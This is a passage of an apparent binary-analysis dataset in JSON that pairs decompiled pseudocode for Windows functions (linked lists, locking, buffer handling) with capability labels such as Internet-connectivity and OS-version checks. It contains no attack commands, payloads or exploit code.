} while (iVar5 + 1U < 0xc0);\n                iVar5 = 0;\ncode_r0x00039475:\n                if (iVar5 != 0) {\n                    *0x88988 = iVar5 + 1;\n                    *0x88984 = iVar5;\n                }\n                *0x88980 = iVar5;\n                *0x8898c = fcn.00039a88(arg1_00, 0x200, 0x3911c);\n                *0x88998 = fcn.00039a88(arg1_00, 0x200, 0x39130);\n                *0x889a0 = fcn.00039a88(arg1_00, 0x200, 0x39140);\n                *0x889a8 = fcn.00039a88(arg1_00, 0x200, 0x39164);\n                *0x889b0 = fcn.00039a88(arg1_00, 0x200, 0x39184);\n                *0x889c0 = fcn.00039a88(arg1_00, 0x200, 0x3919c);\n                *0x889c4 = fcn.00039a88(arg1_00, 0x200, 0x391b4);\n                *0x889b8 = fcn.00039a88(arg1_00, 0x200, 0x391d0);\n                *0x889c8 = fcn.00039a88(arg1_00, 0x200, 0x391f0);\n                *0x8899c = fcn.00039a88(arg1_00, 0x200, 0x39210);\n                *0x889a4 = fcn.00039a88(arg1_00, 0x200, 0x39220);\n                *0x889e4 = fcn.00039a88(arg1_00, 0x200, 0x3923c);\n                *0x889e8 = fcn.00039a88(arg1_00, 0x200, 0x39254);\n                *0x889ec = fcn.00039a88(arg1_00, 0x200, 0x39274);\n                uVar6 = 0;\n            }\n        }\n        if (*0x7b308 != 0) {\n            (**0x11068)(*0x7b308, 0);\n        }\n    }\n    *(iStack344 + 0x28) = uVar1;\n    fcn.000619f6(arg1, auStack392, 0x150);\n    return uVar6;\n}\n",
        "token_count": 1371
    },
    "0003a9c8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.0003a9c8(int64_t arg1, uint *arg2, int32_t *arg3)\n\n{\n    char cVar1;\n    char *pcVar2;\n    uint64_t uVar3;\n    char *pcVar4;\n    uint64_t uVar5;\n    \n    uVar3 = *0x88924;\n    uVar5 = *0x8892c;\n    pcVar2 = *0x88928 + arg1;\n    cVar1 = (**0x11468)(pcVar2);\n    if ((((cVar1 == '\\0') || (cVar1 = (**0x11468)(uVar3 + arg1),  cVar1 == '\\0')) || (*(uVar3 + arg1) != '\\x06')) ||\n       (((cVar1 = *pcVar2,  cVar1 != '\\0' && (cVar1 != '\\x01')) && (cVar1 != '\\x02')))) {\n        pcVar2 = *0x88988 + arg1;\n        pcVar4 = *0x88984 + arg1;\n        cVar1 = (**0x11468)(pcVar2);\n        if (((cVar1 == '\\0') || (cVar1 = (**0x11468)(pcVar4),  cVar1 == '\\0')) ||\n           ((*pcVar4 != '\\x05' || (((cVar1 = *pcVar2,  cVar1 != '\\0' && (cVar1 != '\\x01')) && (cVar1 != '\\x02')))))) {\n            cVar1 = (**0x11468)(pcVar2);\n            if (cVar1 == '\\0') {\n                return 0xffffffff;\n            }\n            cVar1 = (**0x11468)(pcVar4);\n            if (cVar1 == '\\0') {\n                return 0xffffffff;\n            }\n            if (*pcVar4 != '\\x04') {\n                return 0xffffffff;\n            }\n            if (*pcVar2 == '\\0') {\n                *arg2 = 4;\n                *arg3 = 0;\n                return 0;\n            }\n            return 0xffffffff;\n        }\n        *arg2 = 5;\n    }\n    else {\n        if ((*(uVar5 + arg1) & 1) != 0) {\n            return 0xffffffff;\n        }\n        *arg2 = 6;\n    }\n    *arg3 = *pcVar2;\n    return 0;\n}\n",
        "token_count": 538
    },
    "0003ad58": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0003ad58(int64_t arg1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    uint32_t uVar5;\n    int64_t iVar6;\n    int32_t aiStackX8 [2];\n    int32_t aiStackX16 [2];\n    ulong uStackX24;\n    ulong var_28h;\n    ulong auStack552 [2];\n    uchar auStack536 [144];\n    uchar auStack392 [48];\n    int64_t iStack344;\n    \n    if ((arg1 == 0) || (*(arg1 + 0x30) == 0)) {\n        iVar2 = 0x21590065;\n    }\n    else {\n        fcn.000619f6(auStack392, arg1, 0x150);\n        uStackX24 = *(iStack344 + 0x28);\n        iVar2 = fcn.0003ac3c(arg1, 0, auStack536, &uStackX24);\n        iVar4 = *0x7b3f0;\n        if (iVar2 == 0) {\n            uVar5 = 0;\n            do {\n                iVar6 = uVar5 + iVar4;\n                cVar1 = (**0x11468)(iVar6);\n                if ((cVar1 == '\\0') || (cVar1 = (**0x11468)(iVar6 + 0x88),  cVar1 == '\\0')) break;\n                iVar3 = fcn.00061a80(iVar6, auStack536, 0x88, 1, 1);\n                if (iVar3 == 0) goto code_r0x0003ae31;\n                uVar5 = uVar5 + 1;\n            } while (uVar5 < 0x200);\n            uVar5 = 0;\ncode_r0x0003ae31:\n            if (uVar5 != 0) {\n                *0x88924 = uVar5 + 4;\n                *0x88928 = uVar5 + 5;\n                *0x8892c = uVar5 + 8;\n            }\n            *0x88920 = uVar5;\n            *0x88930 = fcn.00039a88(*0x7b3f0, 0x200, 0x3aae8);\n            *0x88934 = fcn.00039a88(*0x7b3f0, 0x200, 0x3ab00);\n            *0x88938 = fcn.00039a88(*0x7b3f0, 0x200, 0x3aad4);\n            *0x8893c = fcn.00039a88(*0x7b3f0, 0x200, 0x3ab20);\n            *0x88940 = fcn.00039a88(*0x7b3f0, 0x200, 0x3ab30);\n            *0x88944 = fcn.00039a88(*0x7b3f0, 0x200, 0x3ac24);\n            *0x88948 = fcn.00039a88(*0x7b3f0, 0x200, 0x3ab48);\n            *0x8894c = fcn.00039a88(*0x7b3f0, 0x200, 0x3ab60);\n            *0x88950 = fcn.00039a88(*0x7b3f0, 0x200, 0x3ab80);\n            *0x88954 = fcn.00039a88(*0x7b3f0, 0x200, 0x3ab9c);\n            *0x88958 = fcn.00039a88(*0x7b3f0, 0x200, 0x3abb4);\n            *0x8895c = fcn.00039a88(*0x7b3f0, 0x200, 0x3abcc);\n            *0x88960 = fcn.00039a88(*0x7b3f0, 0x200, 0x3abe0);\n            *0x88964 = fcn.00039a88(*0x7b3f0, 0x200, 0x3abf4);\n            *0x88968 = fcn.00039a88(*0x7b3f0, 0x200, 0x3ac0c);\n            uStackX24 = *(iStack344 + 0x28);\n            iVar4 = *0x7b3f0;\n            *0x8896c = fcn.00039a88(*0x7b3f0, 0x200, &uStackX24);\n            fcn.0001a764(CONCAT71(iVar4 >> 8, 2), auStack552, &var_28h);\n            iVar4 = *0x7b3f0;\n            do {\n                iVar3 = fcn.0003a9c8(iVar4, aiStackX8, aiStackX16);\n                if ((((iVar3 == 0) && (aiStackX8[0] == 6)) && (aiStackX16[0] == 0)) && (iVar4 != *0x7b3f0)) {\n                    fcn.00033d94(iVar4, 0);\n                }\n                iVar4 = *(iVar4 + 8);\n            } while (iVar4 != 0);\n            fcn.0001a878(auStack552[0], var_28h);\n        }\n        *(iStack344 + 0x28) = uStackX24;\n        fcn.000619f6(arg1, auStack392, 0x150);\n    }\n    return iVar2;\n}\n",
        "token_count": 1316
    },
    "0003b398": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0003b398(int64_t arg1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    uint32_t uVar5;\n    int64_t iVar6;\n    int32_t aiStackX8 [2];\n    int32_t aiStackX16 [2];\n    ulong uStackX24;\n    ulong var_28h;\n    ulong auStack568 [2];\n    uchar auStack552 [160];\n    uchar auStack392 [48];\n    int64_t iStack344;\n    \n    if ((arg1 == 0) || (*(arg1 + 0x30) == 0)) {\n        iVar2 = 0x21590065;\n    }\n    else {\n        fcn.000619f6(auStack392, arg1, 0x150);\n        uStackX24 = *(iStack344 + 0x28);\n        iVar2 = fcn.0003b260(arg1, 0, auStack552, &uStackX24);\n        iVar4 = *0x7b400;\n        if (iVar2 == 0) {\n            uVar5 = 0;\n            do {\n                iVar6 = uVar5 + iVar4;\n                cVar1 = (**0x11468)(iVar6);\n                if ((cVar1 == '\\0') || (cVar1 = (**0x11468)(iVar6 + 0x98),  cVar1 == '\\0')) break;\n                iVar3 = fcn.00061a80(iVar6, auStack552, 0x98, 1, 1);\n                if (iVar3 == 0) goto code_r0x0003b471;\n                uVar5 = uVar5 + 1;\n            } while (uVar5 < 0x200);\n            uVar5 = 0;\ncode_r0x0003b471:\n            if (uVar5 != 0) {\n                *0x888c4 = uVar5 + 4;\n                *0x888c8 = uVar5 + 5;\n                *0x888cc = uVar5 + 8;\n            }\n            *0x888c0 = uVar5;\n            *0x888d0 = fcn.00039a88(*0x7b400, 0x200, 0x3b0dc);\n            *0x888d4 = fcn.00039a88(*0x7b400, 0x200, 0x3b0f4);\n            *0x888d8 = fcn.00039a88(*0x7b400, 0x200, 0x3b0c8);\n            *0x888dc = fcn.00039a88(*0x7b400, 0x200, 0x3b114);\n            *0x888e0 = fcn.00039a88(*0x7b400, 0x200, 0x3b124);\n            *0x888e4 = fcn.00039a88(*0x7b400, 0x200, 0x3b218);\n            *0x888e8 = fcn.00039a88(*0x7b400, 0x200, 0x3b13c);\n            *0x888ec = fcn.00039a88(*0x7b400, 0x200, 0x3b154);\n            *0x888f0 = fcn.00039a88(*0x7b400, 0x200, 0x3b174);\n            *0x888f4 = fcn.00039a88(*0x7b400, 0x200, 0x3b190);\n            *0x888f8 = fcn.00039a88(*0x7b400, 0x200, 0x3b1a8);\n            *0x888fc = fcn.00039a88(*0x7b400, 0x200, 0x3b1c0);\n            *0x88900 = fcn.00039a88(*0x7b400, 0x200, 0x3b1d4);\n            *0x88904 = fcn.00039a88(*0x7b400, 0x200, 0x3b1e8);\n            *0x88908 = fcn.00039a88(*0x7b400, 0x200, 0x3b200);\n            *0x88910 = fcn.00039a88(*0x7b400, 0x200, 0x3b230);\n            *0x88914 = fcn.00039a88(*0x7b400, 0x200, 0x3b248);\n            uStackX24 = *(iStack344 + 0x28);\n            iVar4 = *0x7b400;\n            *0x8890c = fcn.00039a88(*0x7b400, 0x200, &uStackX24);\n            fcn.0001a764(CONCAT71(iVar4 >> 8, 2), auStack568, &var_28h);\n            iVar4 = *0x7b400;\n            do {\n                iVar3 = fcn.0003a9c8(iVar4, aiStackX8, aiStackX16);\n                if ((((iVar3 == 0) && (aiStackX8[0] == 6)) && (aiStackX16[0] == 0x14)) && (iVar4 != *0x7b400)) {\n                    fcn.00033d94(iVar4, 0x14);\n                }\n                iVar4 = *(iVar4 + 8);\n            } while (iVar4 != 0);\n            fcn.0001a878(auStack568[0], var_28h);\n        }\n        *(iStack344 + 0x28) = uStackX24;\n        fcn.000619f6(arg1, auStack392, 0x150);\n    }\n    return iVar2;\n}\n",
        "token_count": 1363
    },
    "0003b740": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.0003b740(ulong arg1, uint *arg2)\n\n{\n    uint64_t *puVar1;\n    ulong uVar2;\n    int32_t iVar3;\n    ulong *arg1_00;\n    ulong *puVar4;\n    uint32_t uVar5;\n    uint64_t uVar7;\n    int64_t iVar8;\n    uint32_t uVar9;\n    uint16_t uVar10;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    bool bVar13;\n    ulong uVar14;\n    uint32_t auStackX16 [2];\n    uint32_t auStackX24 [2];\n    int64_t *piStackX32;\n    int64_t iStack184;\n    int64_t iStack176;\n    int64_t iStack168;\n    int64_t iStack160;\n    uchar auStack152 [8];\n    uint uStack144;\n    uint uStack140;\n    uint uStack136;\n    uint uStack132;\n    uint uStack128;\n    uint uStack96;\n    ulong *puVar6;\n    \n    *0x7b410 = *0x14f50;\n    *0x7b418 = *0x14f58;\n    iStack168 = 0;\n    iStack176 = 0;\n    piStackX32 = NULL;\n    iStack184 = 0;\n    fcn.00061a56(*0x14f50, auStack152, 0, 0x48);\n    uStack144 = *arg2;\n    uStack140 = arg2[1];\n    uStack136 = arg2[2];\n    uStack132 = arg2[3];\n    uStack128 = 1;\n    uStack96 = 0xffffffff;\n    iVar3 = (**0x88ac0)(arg1, auStack152);\n    arg1_00 = NULL;\n    if ((((iVar3 == 0) && (iVar3 = (**0x88ab0)(arg1, iStack168, 0xffffffff, &piStackX32, auStackX16),  iVar3 == 0)) &&\n        (arg1_00 = NULL,  auStackX16[0] != 0)) && (arg1_00 = fcn.0002fbc4(0x10),  arg1_00 != NULL)) {\n        uVar12 = 1;\n        uVar11 = 1;\n        uVar14 = *(*piStackX32 + 0x50);\n        uVar2 = *(*piStackX32 + 0x58);\n        *arg1_00 = uVar14;\n        arg1_00[1] = uVar2;\n        if (1 < auStackX16[0]) {\n            iStack160 = 0x10;\n            iVar8 = 8;\n            uVar9 = auStackX16[0];\n            do {\n                puVar4 = NULL;\n                if (uVar11 != 0) {\n                    puVar6 = puVar4;\n                    do {\n                        puVar1 = *(piStackX32 + iVar8) + 0x50;\n                        bVar13 = arg1_00[puVar6 * 2] < *puVar1;\n                        if ((arg1_00[puVar6 * 2] != *puVar1) ||\n                           (puVar1 = *(piStackX32 + iVar8) + 0x58,  bVar13 = arg1_00[puVar6 * 2 + 1] < *puVar1, \n                           iVar3 = 0,  arg1_00[puVar6 * 2 + 1] != *puVar1)) {\n                            iVar3 = (1 - bVar13) - (bVar13 != 0);\n                        }\n                        if (iVar3 == 0) goto code_r0x0003b927;\n                        uVar5 = puVar6 + 1;\n                        puVar6 = uVar5;\n                    } while (uVar5 < uVar11);\n                }\n                uVar11 = uVar11 + 1;\n                if (uVar11 == 0) {\n                    fcn.0002fc50(arg1_00);\n                }\n                else {\n                    puVar4 = fcn.0002fbc4(uVar11 << 4);\n                    if (puVar4 == NULL) goto code_r0x0003ba39;\n                    fcn.000619f6(puVar4);\n                    fcn.0002fc50(arg1_00);\n                }\n                uVar14 = *(*(piStackX32 + iVar8) + 0x50);\n                uVar2 = *(*(piStackX32 + iVar8) + 0x58);\n                *(iStack160 + puVar4) = uVar14;\n                (iStack160 + puVar4)[1] = uVar2;\n                iStack160 = iStack160 + 0x10;\n                arg1_00 = puVar4;\n                uVar9 = auStackX16[0];\ncode_r0x0003b927:\n                uVar12 = uVar12 + 1;\n                iVar8 = iVar8 + 8;\n            } while (uVar12 < uVar9);\n            if (uVar11 != 1) {\n                iVar3 = (**0x88ac8)(uVar14, arg1, 0, &iStack176);\n                if ((iVar3 == 0) &&\n                   (iVar3 = (**0x88ad0)(arg1, iStack176, 0xffffffff, &iStack184, auStackX24),  iVar3 == 0)) {\n                    uVar10 = 0;\n                    uVar7 = 0;\n                    if (uVar11 != 0) {\n                        do {\n                            uVar12 = 0;\n                            if (auStackX24[0] == 0) break;\n                            iVar8 = 0;\n                            do {\n                                puVar1 = *(iStack184 + iVar8 * 8);\n                                bVar13 = arg1_00[uVar7 * 2] < *puVar1;\n                                if ((arg1_00[uVar7 * 2] == *puVar1) &&\n                                   (bVar13 = arg1_00[uVar7 * 2 + 1] < puVar1[1],  arg1_00[uVar7 * 2 + 1] == puVar1[1]))\n                                {\n                                    iVar3 = 0;\n                                }\n                                else {\n                                    iVar3 = (1 - bVar13) - (bVar13 != 0);\n                                }\n                                if (iVar3 == 0) break;\n                                uVar12 = uVar12 + 1;\n                                iVar8 = iVar8 + 1;\n                            } while (uVar12 < auStackX24[0]);\n                            if (auStackX24[0] <= uVar12) break;\n                            puVar4 = *(iStack184 + iVar8 * 8);\n                            if (uVar10 <= *(puVar4 + 8) && *(puVar4 + 8) != uVar10) {\n                                *0x7b410 = *puVar4;\n                                *0x7b418 = puVar4[1];\n                                uVar10 = *(*(iStack184 + iVar8 * 8) + 0x40);\n                            }\n                            uVar12 = uVar7 + 1;\n                            uVar7 = uVar12;\n                        } while (uVar12 < uVar11);\n                    }\n                }\n                goto code_r0x0003ba39;\n            }\n        }\n        *0x7b410 = *(*piStackX32 + 0x50);\n        *0x7b418 = *(*piStackX32 + 0x58);\n    }\ncode_r0x0003ba39:\n    if (piStackX32 != NULL) {\n        (**0x88aa8)(&piStackX32);\n    }\n    if (iStack184 != 0) {\n        (**0x88aa8)(&iStack184);\n    }\n    if (iStack168 != 0) {\n        (**0x88ab8)(arg1);\n    }\n    if (iStack176 != 0) {\n        (**0x88ad8)(arg1);\n    }\n    if (arg1_00 != NULL) {\n        fcn.0002fc50(arg1_00);\n    }\n    return 0x7b410;\n}\n",
        "token_count": 1836
    },
    "0003c1ec": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0003c1ec(ulong arg1)\n\n{\n    int32_t iVar1;\n    bool bVar2;\n    ulong auStackX16 [3];\n    \n    LOCK();\n    bVar2 = *0x7b4e8 == 1;\n    *0x7b4e8 = *0x7b4e8 ^ bVar2 * (*0x7b4e8 ^ 1);\n    if (bVar2) {\n        if ((arg1 != 0) && (arg1 != *0x7b408)) {\n            iVar1 = fcn.0004dd68(arg1, 0x15618, auStackX16);\n            if (iVar1 != 0) {\n                return;\n            }\n            fcn.0004c898(arg1, auStackX16[0]);\n        }\n        *0x7b4e8 = 0;\n        if (*0x7b500 != 0) {\n            fcn.0002ee20(0x7b510);\n            iVar1 = fcn.00031694(0x7b500);\n            if (iVar1 == 0) {\n                fcn.00061aa4(*0x7b500, 0, 0);\n            }\n            *0x7b500 = 0;\n            *0x7b508 = 0;\n            fcn.0002edfc(0x7b510);\n        }\n        fcn.0003d134();\n        if (*0x7b4d8 != 0) {\n            (**0x7b008)();\n            *0x7b4d8 = 0;\n        }\n        if (*0x7b4d0 != 0) {\n            (**0x7b090)();\n            *0x7b4d0 = 0;\n        }\n        if (*0x7b4c8 != 0) {\n            (**0x7aff8)();\n            *0x7b4c8 = 0;\n        }\n        fcn.0003d2a8();\n        if (*0x7b438 != 0) {\n            (**0x7b0c0)();\n        }\n        if (*0x7b448 != 0) {\n            (**0x7b0c0)();\n        }\n        if (*0x7b488 != 0) {\n            (**0x7b0c0)();\n        }\n        if (*0x7b498 != 0) {\n            (**0x7b0c0)();\n        }\n        if (*0x7b4a8 != 0) {\n            (**0x7b0c0)();\n        }\n        if (*0x7b4b8 != 0) {\n            (**0x7b0c0)();\n        }\n        if (*0x7b430 != 0) {\n            (**0x7b098)();\n        }\n        *0x7b430 = 0;\n        (*_fcn.00011360)(*0x7b428);\n        *0x7b408 = 0;\n    }\n    return;\n}\n",
        "token_count": 668
    },
    "0003cf28": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.0003cf28(void)\n\n{\n    int32_t iVar1;\n    ulong uVar2;\n    uint32_t *puVar3;\n    bool bVar4;\n    uint32_t *apuStackX8 [4];\n    uchar auStack280 [272];\n    \n    apuStackX8[0] = NULL;\n    LOCK();\n    bVar4 = *0x7b4e8 == 1;\n    *0x7b4e8 = *0x7b4e8 ^ bVar4 * (*0x7b4e8 ^ 1);\n    if (!bVar4) {\n        uVar2 = fcn.0002f490(5, apuStackX8);\n        puVar3 = apuStackX8[0];\n        if (uVar2 != 0) {\n            return uVar2;\n        }\n        while( true ) {\n            do {\n                iVar1 = fcn.00030e70(puVar3[0x14], auStack280, 0x104);\n            } while (iVar1 == 0);\n            iVar1 = fcn.00061ad4(auStack280, 0x11cd8);\n            if (iVar1 == 0) {\n                fcn.0003cee4(*(puVar3 + 0x14));\n            }\n            if (*puVar3 == 0) break;\n            puVar3 = puVar3 + *puVar3;\n        }\n        fcn.0002fc50(apuStackX8[0]);\n    }\n    return 0;\n}\n",
        "token_count": 343
    },
    "0003cfc4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0003cfc4(ulong arg1, ulong noname_1, ulong arg3)\n\n{\n    uint uVar1;\n    int64_t *piVar2;\n    ushort extraout_AX;\n    ushort uVar3;\n    ushort extraout_var;\n    uint extraout_var_00;\n    ushort in_R9W;\n    uchar auStack56 [16];\n    \n    if (*0x7b518 != 0) {\n        fcn.0002fbf0(0x18);\n        piVar2 = CONCAT44(extraout_var_00, CONCAT22(extraout_var, extraout_AX));\n        if ((CONCAT44(extraout_var_00, CONCAT22(extraout_var, extraout_AX)) &\n            CONCAT44(extraout_var_00, CONCAT22(extraout_var, extraout_AX))) != 0) {\n            uVar1 = fcn.0002fcf4(arg1);\n            *(piVar2 + 1) = uVar1;\n            uVar1 = fcn.0002fcf4(arg3);\n            *(piVar2 + 0xc) = uVar1;\n            uVar3 = fcn.0002fd20(noname_1);\n            *(piVar2 + 2) = uVar3;\n            uVar3 = fcn.0002fd20(in_R9W);\n            *(piVar2 + 0x12) = uVar3;\n            fcn.00031564(0x7b520, auStack56, 1);\n            *piVar2 = *0x7b538;\n            *0x7b538 = piVar2;\n            fcn.00031598(0x7b520, auStack56, 1);\n        }\n    }\n    return;\n}\n",
        "token_count": 380
    },
    "0003d070": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0003d070(ulong arg1, ulong noname_1, ulong arg3)\n\n{\n    ulong *puVar1;\n    ulong *puVar2;\n    ulong *puVar3;\n    int16_t in_R9W;\n    uchar auStack56 [16];\n    \n    if (*0x7b518 != 0) {\n        fcn.00031564(0x7b520, auStack56, 1);\n        puVar1 = *0x7b538;\n        puVar3 = NULL;\n        while (puVar2 = puVar1,  puVar2 != NULL) {\n            puVar1 = *0x7b538;\n            if ((((*(puVar2 + 1) == arg1) && (*(puVar2 + 0xc) == arg3)) && (*(puVar2 + 2) == noname_1)) &&\n               ((*(puVar2 + 0x12) == in_R9W && (puVar1 = *puVar2,  puVar3 != NULL)))) {\n                *puVar3 = *puVar2;\n                puVar1 = *0x7b538;\n            }\n            *0x7b538 = puVar1;\n            puVar3 = puVar2;\n            puVar1 = *puVar2;\n        }\n        fcn.00031598(0x7b520, auStack56, 1);\n        fcn.0002fc50(0);\n    }\n    return;\n}\n",
        "token_count": 325
    },
    "0003d268": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0003d268(void)\n\n{\n    if (*0x7b568 == 0) {\n        *0x7b560 = 0x7b558;\n        *0x7b558 = 0x7b558;\n        fcn.000313e0(0x7b540);\n        *0x7b568 = 1;\n    }\n    return;\n}\n",
        "token_count": 87
    },
    "0003d2a8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0003d2a8(void)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    uchar auStackX8 [8];\n    ulong uStackX16;\n    \n    if (*0x7b568 != 0) {\n        *0x7b568 = 0;\n        fcn.00031564(0x7b540, auStackX8, 0);\n        iVar1 = *0x7b560;\n        iVar2 = *0x7b558;\n        while (iVar2 != 0x7b558) {\n            (*_fcn.00011638)(iVar1 + 0x6b8, 0);\n            iVar1 = *(iVar1 + 8);\n            iVar2 = iVar1;\n        }\n        fcn.00031598(0x7b540, auStackX8, 0);\n        while( true ) {\n            fcn.00031564(0x7b540, auStackX8, 0);\n            if (*0x7b558 == 0x7b558) break;\n            fcn.00031598(0x7b540, auStackX8, 0);\n            uStackX16 = 0xffffffffff676980;\n            (**0x115e0)(0, 0);\n        }\n        fcn.00031598(0x7b540, auStackX8, 0);\n        fcn.000315d4(0x7b540);\n    }\n    return;\n}\n",
        "token_count": 330
    },
    "0003d378": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong * fcn.0003d378(ulong arg1, ulong noname_1, ulong arg3)\n\n{\n    ulong *puVar1;\n    ushort in_R9W;\n    ulong in_stack_00000028;\n    ushort in_stack_00000030;\n    uchar auStack56 [16];\n    \n    if ((*0x7b568 != 0) && (puVar1 = fcn.0002fbf0(0x728),  puVar1 != NULL)) {\n        fcn.00061a56(puVar1, 0);\n        *(puVar1 + 0x656) = in_stack_00000030;\n        *(puVar1 + 0xca) = arg3;\n        *(puVar1 + 0x654) = in_R9W;\n        *(puVar1 + 0xc9) = arg1;\n        *(puVar1 + 0x64c) = noname_1;\n        puVar1[0xcf] = in_stack_00000028;\n        *(puVar1 + 0xcb) = 0;\n        fcn.000313e0(puVar1 + 0xd0);\n        (*_fcn.00011600)(puVar1 + 0xd3, 1);\n        (*_fcn.00011600)(puVar1 + 0xd7, 1);\n        (*_fcn.00011600)(puVar1 + 0xda, 1);\n        (*_fcn.00011600)(puVar1 + 0xdd, 1);\n        fcn.00031564(0x7b540, auStack56, 1);\n        puVar1[1] = *0x7b560;\n        *puVar1 = 0x7b558;\n        **0x7b560 = puVar1;\n        *0x7b560 = puVar1;\n        fcn.00031598(0x7b540, auStack56, 1);\n        return puVar1;\n    }\n    return NULL;\n}\n",
        "token_count": 442
    },
    "0003d934": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.0003d934(int64_t arg1, int64_t arg2, uint64_t arg3, uint64_t *arg4)\n\n{\n    uint uVar1;\n    ulong uVar2;\n    int32_t iVar3;\n    uint64_t uVar4;\n    ulong *puVar5;\n    int64_t iVar6;\n    uint64_t uVar7;\n    ulong *puVar8;\n    ulong *arg1_00;\n    uint64_t uVar9;\n    int64_t arg1_01;\n    uchar auStackX8 [8];\n    int64_t iStackX16;\n    uint64_t *puStackX32;\n    int32_t in_stack_00000028;\n    int64_t iStack0000000000000028;\n    uint32_t in_stack_ffffffffffffff68;\n    uint32_t uVar10;\n    uint64_t in_stack_ffffffffffffff70;\n    int64_t iStack88;\n    int64_t iStack80;\n    \n    uVar7 = 0;\n    uVar9 = in_stack_ffffffffffffff70 >> 8;\n    *arg4 = 0;\n    uVar10 = in_stack_ffffffffffffff68 >> 8;\n    iStackX16 = arg2;\n    puStackX32 = arg4;\n    while( true ) {\n        uVar9 = uVar9 << 8;\n        uVar10 = uVar10 << 8;\n        iStack0000000000000028 = in_stack_00000028 * -100 * 10000000;\n        iStack88 = arg1 + 0x698;\n        iStack80 = arg1 + 0x6b8;\n        uVar4 = (**0x11490)(2, &iStack88, 1, 0, uVar10, uVar9, &stack0x00000028, 0);\n        if (uVar4 == 1) {\n            return uVar4;\n        }\n        if (uVar4 == 0x102) {\n            return uVar4;\n        }\n        fcn.00031564(arg1 + 0x680, auStackX8, 1);\n        if (*(arg1 + 0x6b0) != 0) break;\n        fcn.00031598(arg1 + 0x680, auStackX8, 1);\n        uVar9 = uVar9 >> 8;\n        uVar10 = uVar10 >> 8;\n    }\n    arg1_00 = *(arg1 + 0x6b0);\n    for (puVar8 = arg1_00; puVar8 != NULL; puVar8 = *puVar8) {\n        uVar7 = uVar7 + puVar8[2];\n        if (arg3 <= uVar7) {\n            if (uVar7 == arg3) {\n                *(arg1 + 0x6b0) = *puVar8;\n                *puVar8 = 0;\n            }\n            else {\n                arg1_01 = uVar7 - arg3;\n                puVar5 = fcn.0002fbf0(0x20);\n                iVar6 = fcn.0002fbf0(arg1_01);\n                arg4 = puStackX32;\n                arg2 = iStackX16;\n                if ((puVar5 != NULL) && (iVar6 != 0)) {\n                    fcn.00061a56(puVar5, 0, 0x20);\n                    fcn.000619f6(iVar6, (puVar8[3] - arg1_01) + puVar8[2], arg1_01);\n                    puVar5[3] = iVar6;\n                    puVar5[2] = arg1_01;\n                    *(arg1 + 0x6b0) = puVar5;\n                    *puVar5 = *puVar8;\n                    puVar8[2] = puVar8[2] - arg1_01;\n                    *puVar8 = 0;\n                    arg4 = puStackX32;\n                    arg2 = iStackX16;\n                }\n            }\n            goto code_r0x0003daff;\n        }\n    }\n    *(arg1 + 0x6b0) = 